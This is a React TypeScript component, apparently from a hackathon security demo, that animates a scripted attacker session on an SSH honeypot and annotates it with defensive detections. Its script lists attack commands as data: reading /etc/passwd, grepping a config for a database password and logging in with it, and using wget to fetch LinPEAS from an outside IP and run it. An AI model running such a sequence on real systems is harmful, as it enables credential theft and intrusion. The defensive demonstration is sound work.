// frontend/src/components/visualizations/HoneypotSandbox.tsx
// Honeypot terminal — fake attacker session with live annotations
// WHY: Deception is hard to visualize. This component shows judges
// a simulated attacker being deceived in real time — their commands
// appear, IMMUNIS silently captures everything, and annotations
// reveal deception layer at work.

import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Card } from '../common/Card';

// ─── Types ────────────────────────────────────────────────────────────────────

interface TerminalLine {
  id: number;
  timestamp: string;
  content: string;
  type: 'command' | 'output' | 'annotation' | 'system';
}

interface HoneypotSandboxProps {
  isActive?: boolean;
  className?: string;
}

// ─── Simulated Session ────────────────────────────────────────────────

const SESSION_SCRIPT: { delay: number; content: string; type: TerminalLine['type'] }[] = [
  { delay: 0, content: '[ SSH Honeypot Active — Port 2222 ]', type: 'system' },
  { delay: 1200, content: 'Connection from 197.42.118.33:44721', type: 'system' },
  { delay: 800, content: '[IMMUNIS] Session captured. Behavioural recording started.', type: 'annotation' },
  { delay: 1500, content: '$ whoami', type: 'command' },
  { delay: 400, content: 'root', type: 'output' },
  { delay: 1000, content: '$ uname -a', type: 'command' },
  { delay: 500, content: 'Linux honeypot-za-01 5.15.0 #1 SMP x86_64 GNU/Linux', type: 'output' },
  { delay: 1800, content: '$ cat /etc/passwd', type: 'command' },
  { delay: 600, content: 'root:x:0:0:root:/root:/bin/bash', type: 'output' },
  { delay: 200, content: 'admin:x:1000:1000:Admin:/home/admin:/bin/bash', type: 'output' },
  { delay: 200, content: 'mysql:x:27:27:MySQL:/var/lib/mysql:/bin/false', type: 'output' },
  { delay: 500, content: '[IMMUNIS] Credential harvesting detected → MITRE T1003', type: 'annotation' },
  { delay: 2000, content: '$ find / -name "*.conf" -type f 2>/dev/null', type: 'command' },
  { delay: 800, content: '/etc/mysql/my.cnf', type: 'output' },
  { delay: 200, content: '/etc/apache2/apache2.conf', type: 'output' },
  { delay: 200, content: '/etc/ssh/sshd_config', type: 'output' },
  { delay: 1500, content: '$ cat /etc/mysql/my.cnf | grep password', type: 'command' },
  { delay: 600, content: 'password = Pr0d_DB_2025!@za', type: 'output' },
  { delay: 300, content: '[IMMUNIS] Canary token triggered! Fake credential captured (SHA256 hashed).', type: 'annotation' },
  { delay: 2200, content: '$ mysql -u root -pPr0d_DB_2025!@za -e "show databases"', type: 'command' },
  { delay: 800, content: '+--------------------+', type: 'output' },
  { delay: 100, content: '| Database           |', type: 'output' },
  { delay: 100, content: '| information_schema |', type: 'output' },
  { delay: 100, content: '| customer_data      |', type: 'output' },
  { delay: 100, content: '| financial_records  |', type: 'output' },
  { delay: 100, content: '+--------------------+', type: 'output' },
  { delay: 500, content: '[IMMUNIS] RL honeypot action: PARTIAL — showing fake database schema', type: 'annotation' },
  { delay: 2500, content: '$ wget http://185.220.101.45/tools/linpeas.sh', type: 'command' },
  { delay: 1000, content: 'Saving to: linpeas.sh', type: 'output' },
  { delay: 500, content: '[IMMUNIS] Tool detected: LinPEAS (sophistication: 6/10) → MITRE T1059.004', type: 'annotation' },
  { delay: 2000, content: '$ chmod +x linpeas.sh && ./linpeas.sh', type: 'command' },
  { delay: 1200, content: '[IMMUNIS] RL honeypot action: REDIRECT — sandboxed execution', type: 'annotation' },
  { delay: 800, content: '[IMMUNIS] 128-dim fingerprint extracted. Cluster: APT-ZA-03 (Mercenary)', type: 'annotation' },
  { delay: 1000, content: '[IMMUNIS] Threat level: HIGH. Session duration: 47s. Alerting SOC.', type: 'annotation' },
];

let lineCounter = 0;

// ─── Component ────────────────────────────────────────────────────────────────

export function HoneypotSandbox({ isActive = true, className = '' }: HoneypotSandboxProps) {
  const [lines, setLines] = useState<TerminalLine[]>([]);
  const [scriptIdx, setScriptIdx] = useState(0);
  const scrollRef = useRef<HTMLDivElement>(null);

  // Auto-scroll
  useEffect(() => {
    if (scrollRef.current) {
      scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
    }
  }, [lines]);

  // Play script
  useEffect(() => {
    if (!isActive || scriptIdx >= SESSION_SCRIPT.length) return;

    const entry = SESSION_SCRIPT[scriptIdx];
    const timer = setTimeout(() => {
      const now = new Date();
      const ts = now.toLocaleTimeString('en-ZA', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

      setLines((prev) => [
        ...prev.slice(-40), // Keep last 40 lines
        {
          id: ++lineCounter,
          timestamp: ts,
          content: entry.content,
          type: entry.type,
        },
      ]);

      setScriptIdx((prev) => prev + 1);
    }, entry.delay);

    return () => clearTimeout(timer);
  }, [scriptIdx, isActive]);

  // Loop script
  useEffect(() => {
    if (scriptIdx >= SESSION_SCRIPT.length && isActive) {
      const timer = setTimeout(() => {
        setScriptIdx(0);
        setLines([]);
      }, 5000);
      return () => clearTimeout(timer);
    }
  }, [scriptIdx, isActive]);

  const lineColors: Record<TerminalLine['type'], string> = {
    command: '#00E5A0',
    output: '#9CA3AF',
    annotation: '#FFAA33',
    system: '#38BDF8',
  };

  return (
    <Card
      title="Honeypot Sandbox"
      actions={
        <div className="flex items-center gap-1.5">
          <span className={`w-2 h-2 rounded-full ${isActive ? 'bg-red-400 animate-pulse' : 'bg-gray-500'}`} />
          <span className="text-[10px]" style={{ color: 'var(--text-muted)' }}>
            {isActive ? 'LIVE CAPTURE' : 'INACTIVE'}
          </span>
        </div>
      }
      padding="none"
      className={className}
    >
      <div
        ref={scrollRef}
        className="font-mono text-xs overflow-y-auto"
        style={{
          background: '#0C0C0C',
          height: 320,
          padding: '12px 16px',
        }}
      >
        {/* Terminal header bar */}
        <div className="flex items-center gap-1.5 mb-3 pb-2" style={{ borderBottom: '1px solid rgba(55,65,81,0.3)' }}>
          <div className="w-2.5 h-2.5 rounded-full bg-red-500" />
          <div className="w-2.5 h-2.5 rounded-full bg-yellow-500" />
          <div className="w-2.5 h-2.5 rounded-full bg-green-500" />
          <span className="ml-2 text-[10px]" style={{ color: '#6B7280' }}>
            honeypot-za-01 — ssh session
          </span>
        </div>

        <AnimatePresence initial={false}>
          {lines.map((line) => (
            <motion.div
              key={line.id}
              initial={{ opacity: 0, x: -5 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ duration: 0.15 }}
              className="flex gap-2 leading-relaxed"
              style={{ marginBottom: 2 }}
            >
              <span style={{ color: '#374151', flexShrink: 0 }}>{line.timestamp}</span>
              <span style={{ color: lineColors[line.type] }}>{line.content}</span>
            </motion.div>
          ))}
        </AnimatePresence>

        {/* Blinking cursor */}
        {isActive && (
          <div className="flex items-center gap-1 mt-1">
            <span style={{ color: '#00E5A0' }}>$</span>
            <span
              className="inline-block w-2 h-4 animate-pulse"
              style={{ background: '#00E5A0' }}
            />
          </div>
        )}
      </div>
    </Card>
  );
}

export default HoneypotSandbox;
